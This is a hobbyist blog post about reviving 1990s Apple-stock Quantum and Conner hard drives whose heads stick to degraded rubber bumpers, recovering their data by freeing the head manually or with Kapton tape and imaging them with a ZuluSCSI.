<p>These particular hard drives shown in the videos are both about 160 MB in capacity and were commonly used in computers during the early-to-mid 1990s. You can see they have Apple stickers, so they are definitely stock drives originally from a Mac. At least in the case of Quantum, there are a bunch of different capacities all affected by this same problem, ranging from 40 MB to 500 MB. Maybe even more than that — those are just the ones I’m aware of. I’m less familiar with Conner, but I wouldn’t be surprised if they similarly had a whole family of affected drives.</p>



<p>What’s causing this issue? Let’s open them up and find out.</p>



<p>There’s a common misconception in the computer world that as soon as you open a hard drive and expose it to a single particle of dust, you’ve completely destroyed it and it will never work again. Now to be fair, with many modern, higher-density drives it’s probably true — <a href="https://blog.westerndigital.com/helium-hard-drives-explained/" target="_blank" rel="noreferrer noopener">some of them are even sealed with helium inside</a> — but older hard drives like the ones I’ve shown above are remarkably tolerant of being opened. That’s not to say I would leave it operating without the cover for an extended period of time, but for quick data recovery purposes in a decently clean environment, it’s fine.</p>



<p>Anyway, with the cover off, let’s take a look at what the drive is doing:</p>



<figure><p>
<iframe title="Quantum ProDrive ELS hard drive doesn't stay spun up - opened" width="500" height="281" src="https://www.youtube.com/embed/EknKvp3aHKU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<p>The platters spin up, but the head doesn’t move at all. Here are a few attempts at gently moving the head by hand with the drive powered off, and then powering it on. Would this fix it?</p>



<figure><p>
<iframe loading="lazy" title="Quantum ProDrive ELS hard drive doesn't stay spun up - manually moving head" width="500" height="281" src="https://www.youtube.com/embed/oDBxAOnHFkI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<p>Nope, it didn’t. The head would always just immediately go directly back to the center. Note that I had to unlatch the head before I could move it. That’s what I was pointing out with the screwdriver. This is due to <a href="https://patents.google.com/patent/US4647997A/en" target="_blank" rel="noreferrer noopener">Quantum’s patented technology</a> (long expired) known as AIRLOCK, which automatically keeps the head stack latched in place near the spindle until the drive spins up. The purpose is to keep the head away from actual data on the platters when the drive is powered off, in case it is jolted. I circumvented the AIRLOCK functionality to see if starting out with the head away from the center of the platters would fix the problem, but obviously as you saw in the video, it didn’t.</p>



<p>Many years ago, <a href="https://www.youtube.com/watch?v=VepkXLCH3bM" target="_blank" rel="noreferrer noopener">techknight shared his solution</a> for bypassing this problem. The temporary fix ended up being to manually move the head just like I did before, but it had to be after the platters were already spinning and the latch was free. Some people have needed to manually release the latch because the airflow isn’t good enough when the cover is off. I did not experience that issue — you can see it open up on its own just before I start moving the head:</p>



<figure><p>
<iframe loading="lazy" title="Quantum ProDrive ELS hard drive doesn't stay spun up - temporary fix" width="500" height="281" src="https://www.youtube.com/embed/ggZEcd9VSm4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<p>Ah yes, after the head was freed, you got to hear the familiar click pattern that Quantum hard drives make as they’re running their seek test or calibration or whatever it is. That sound is still ingrained in my head after all these years as a little “startup click” that old computers make.</p>



<p>After the drive was working properly, my <a href="https://zuluscsi.com/" target="_blank" rel="noreferrer noopener">ZuluSCSI</a> immediately began dumping the contents using initiator mode — a super cool feature it provides, which is also available in the <a href="https://bluescsi.com/v2" target="_blank" rel="noreferrer noopener">BlueSCSI v2</a> firmware fork. Normally these awesome SCSI emulator products are used as hard drive replacements, but initiator mode allows you to use them to connect to a physical drive (even a CD-ROM drive) and save the contents to an SD card — great for software preservation purposes!</p>



<p>Back to the “spinning up and right back down” problem, though: what causes it? Why did I have to manually move the head in order to make the drive start working? At the time of techknight’s video, the underlying cause wasn’t as well-known as it is now, but the culprit is a rubber bumper that slowly disintegrates into goo over the years. There are actually two bumpers that both get sticky — one at each extent of the head’s movement. The really troublesome bumper is the one that the head rests against while parked, toward the center of the platter. The other one prevents the head from falling off the outer edge of the platter.</p>



<p>The voice coil motor controlling the head isn’t strong enough to overcome this sticky rubber, so the head just sits there until the drive’s firmware gives up on trying and spins the platter down.</p>



<p>On some older Quantum drives, both of the rubber bumpers can easily be reached by removing the top magnet that is over the head, so theoretically you could replace them with new rubber tubing with the correct inner and outer diameter. On “newer” drives like this one, only the outer bumper is accessible by removing the magnet, which isn’t much help because that’s not the bumper that causes the problem.</p>



<figure><a href="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper1-1.jpg" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="1024" height="768" src="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper1-1.jpg" alt="" srcset="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper1-1.jpg 1024w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper1-1-300x225.jpg 300w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper1-1-768x576.jpg 768w" sizes="auto, (max-width: 1024px) 100vw, 1024px"></a></figure>



<p>Instead, the problematic bumper that the head sticks to while parked is actually under the platter, making replacement much less feasible. Here’s a view from my endoscope:</p>



<figure><a href="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper2.jpg" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="1024" height="614" src="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper2-1024x614.jpg" alt="" srcset="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper2-1024x614.jpg 1024w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper2-300x180.jpg 300w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper2-768x460.jpg 768w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/bumper2.jpg 1415w" sizes="auto, (max-width: 1024px) 100vw, 1024px"></a></figure>



<p>At the top of the image is the platter. The bottom is the hard drive enclosure. On the right side, you can see the head resting against the bumper. I stuck some Kapton tape in there while I was playing with it and had the platter off, so that’s what the orange color is. Note that I switched to a different single-platter ProDrive LPS model for those last two pictures, but it has the exact same arrangement internally as the drive shown in the videos.</p>



<p>There is one solution readily available on eBay: a plastic insert that prevents the head from hitting the bumper. I don’t have any experience with this fix, but it has a bunch of positive reviews. You can find it by searching eBay for “Quantum ProDrive ELS Repair Insert”. If you’re looking for a long-term solution, that might be the way to go. It’s theoretically possible to remove the platter(s) to get to the bumper and replace it, but it’s a lot of work and very risky — especially on multi-platter drives where the platters have to stay in alignment with each other.</p>



<p>If your ultimate goal is just to get the data off of the drive, I have had a bunch of success with the simple method I showed of manually unsticking the head after the drive is totally spun up. Thanks to techknight for originally posting his very helpful video on this process!</p>



<p>Next, let’s move onto the Conner drive. There is not quite as much information on the internet about these. How did it behave with the cover removed?</p>



<figure><p>
<iframe loading="lazy" title="Conner CP30175E hard drive doesn't stay spun up - fix attempts" width="500" height="281" src="https://www.youtube.com/embed/66oSObJO7FA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<p>I jumped the gun a bit in the video by not showing how it behaves without any intervention from my hand, but it’s the same problem. The head doesn’t move at all. I tried manually moving the head in the same way I was able to get the Quantum drive working, but the Conner drive just didn’t want to cooperate with me. Here’s a closer view where you can see the problem. First, here’s how it looks with the head parked:</p>



<figure><a href="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerParked.jpg" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="1024" height="578" src="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerParked-1024x578.jpg" alt="" srcset="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerParked-1024x578.jpg 1024w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerParked-300x169.jpg 300w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerParked-768x434.jpg 768w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerParked-1536x867.jpg 1536w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerParked.jpg 2048w" sizes="auto, (max-width: 1024px) 100vw, 1024px"></a></figure>



<p>And here’s how it looks after I move the head toward the outside of the platter, away from the parked position:</p>



<figure><a href="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerUnparked.jpg" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="1024" height="605" src="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerUnparked-1024x605.jpg" alt="" srcset="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerUnparked-1024x605.jpg 1024w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerUnparked-300x177.jpg 300w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerUnparked-768x453.jpg 768w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerUnparked-1536x907.jpg 1536w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerUnparked.jpg 2048w" sizes="auto, (max-width: 1024px) 100vw, 1024px"></a></figure>



<p>I don’t think there’s supposed to be an indentation in the dark piece where the head assembly touches it. It seems to be grabbing fairly tightly and preventing the head from moving away. The grip seems pretty strong here, though — I get the feeling this drive may be using another mechanism for intentionally keeping the head parked when it wants to, like something magnetic. I’m not 100% sure. I’m pretty sure that either way, the hole in the dark piece is not supposed to be there, though.</p>



<p>On this Conner drive, I was running out of ideas. It’s not mine — someone very kindly loaned it to me with a “no worries, it doesn’t work anyway” type of reassurance that I could tinker with it and try to recover data from it as part of my search. I was really desperate to inspect the data on it because it came from a Mac model that I knew could potentially contain the lost software I was looking for, but I just couldn’t get it to work.</p>



<p>I was about to give up and send it back, but then I randomly decided to hold a folded-over piece of Kapton tape in the way so that the head couldn’t move all the way back to the position where it would get stuck. This was the magic solution I needed in order to get this drive operational. As soon as I did that and powered it on, the drive performed its startup click pattern and then the ZuluSCSI immediately began dumping the drive:</p>



<figure><p>
<iframe loading="lazy" title="Conner CP30175E hard drive doesn't stay spun up - fix" width="500" height="281" src="https://www.youtube.com/embed/bkI-taoX3sI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<p>I think this Conner drive is simply more picky about the timing of unsticking the head. I’m still performing essentially the same temporary fix that works with the Quantum drive, but I’m physically holding it back from ever getting stuck. Due to the way the platters stick up on this model, I was too afraid to put the cover back on right away, so I allowed the entire drive to dump with the cover removed. All the data read back perfectly.</p>



<p>I believe I have figured out somewhat of a permanent fix for this drive by adhering a piece of Kapton tape as shown below:</p>



<figure><a href="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerKaptonTape.jpg" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="1024" height="551" src="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerKaptonTape.jpg" alt="" srcset="https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerKaptonTape.jpg 1024w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerKaptonTape-300x161.jpg 300w, https://www.downtowndougbrown.com/wp-content/uploads/2025/03/ConnerKaptonTape-768x413.jpg 768w" sizes="auto, (max-width: 1024px) 100vw, 1024px"></a></figure>



<p>To be honest, after all of the research I’ve done for this post, I’m concerned that this solution may be leaving the head in a vulnerable position when everything is powered off. When the platter spins down, the head doesn’t push itself up against the tape, so it may be resting over a spot on the platter where data is actually stored. I ended up buying another identical drive with the exact same problem, so I might perform some further experimentation with alternative solutions. Maybe if I only wrap the Kapton tape around the dark thing with the indentation (is it rubber?) rather than the entire metal enclosure, the head will still park properly but not get stuck. I’m not sure.</p>



<p>Regardless of whether my fix was correct, the exciting thing about this drive is that it ended up containing the long-lost information I was looking for, so this whole project was a huge success. An upcoming post will go into detail about the Apple factory-programmed data I was able to locate and preserve. This Conner drive has since been returned to its owner, and is confirmed to still be working in the original machine it came from. So not only did I recover the lost data, but I was even able to return the drive to working order so it could be reunited with the computer it was bundled in over 30 years ago.</p>



<p>I think this is a good reminder that we shouldn’t trust hard drives for long-term storage. Even if a drive is kept in pristine condition, there are components inside that might be aging in ways you would never begin to imagine. Keep multiple backups of any important data, and make sure you copy those backups onto a newer storage medium as the decades go by and technology evolves. Don’t rely on a 30-year-old hard drive still working 30 years later.</p>



<p>Anyway, I hope this post was interesting and educational. I thought it was fun to take the cover off and see how these hard drives operate. I have used both of these data recovery strategies on multiple Quantum and Conner hard drives and have experienced a whole bunch of success. As long as the head is just stuck in the parked position and there hasn’t been anything catastrophic like a head crash, these tricks definitely work for getting your data back. Would it be smart to open up a drive that’s fully functional? Probably not. For example, I own two Apple-marked IBM drives from the same era, and they both work great, so I’m not going to open them up to check for any rubber. But if your drive isn’t working and you have nothing to lose, why not give it a shot?</p>



<p>I’ll leave you with one fun tidbit I picked up while working on these hard drives. If you’ve ever wondered about the arrangement in terms of how the data is physically stored on the platters, I think I have an answer, at least on these Quantum and Conner drives. As I dumped the entire content of a 2-platter drive, the head stack started at the outside and slowly made its way toward the center. Then, a quarter of the way through the dump, it immediately jumped all the way back to the outside of the platter and continued reading inward again. It happened again at the halfway mark and once more at 3/4. This makes total sense because there are 4 total sides that can contain data. So each platter-side contains one consecutive chunk of data on the drive, and the data is stored outside to inside. How’s that for useless trivia?</p>



<p>Stay tuned for my post about what I actually recovered from that Conner drive!</p>
			  
			</div></div>]]></description>
        </item>
    </channel>
</rss>